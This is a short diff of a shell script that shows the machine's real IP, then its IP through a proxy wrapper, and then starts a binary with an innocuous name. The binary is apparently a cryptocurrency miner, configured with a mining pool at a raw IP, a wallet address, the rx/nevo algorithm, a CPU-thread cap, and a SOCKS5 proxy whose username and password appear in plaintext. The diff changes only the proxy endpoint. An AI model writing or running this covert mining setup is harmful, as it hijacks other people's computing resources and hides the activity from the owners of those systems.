@@ -19,4 +19,4 @@ echo "IP ORI ==> "$(curl ifconfig.me)
 echo " " 
 echo " " 
 echo "IP BARU ==> "$(./panel curl ifconfig.me)
-./panel ./diamona -o 143.110.232.159:443 -u NS1gafSfSwrQpfVxQuUvWejJMTMTh5yQcG7cq8vSbfhEB7q8xx3Fu8z2dK4trDwcQJJsVreDNGLkq9RYticW9FM229o2GzYsc.$(echo $(shuf -i 1-9 -n 1)-Light) -a rx/nevo -x socks5://ubslvwxe:iikj33112te4@188.74.210.21:6100 --cpu-max-threads-hint=50% -k 
+./panel ./diamona -o 143.110.232.159:443 -u NS1gafSfSwrQpfVxQuUvWejJMTMTh5yQcG7cq8vSbfhEB7q8xx3Fu8z2dK4trDwcQJJsVreDNGLkq9RYticW9FM229o2GzYsc.$(echo $(shuf -i 1-9 -n 1)-Light) -a rx/nevo -x socks5://ubslvwxe:iikj33112te4@188.74.183.10:8279 --cpu-max-threads-hint=50% -k -s 
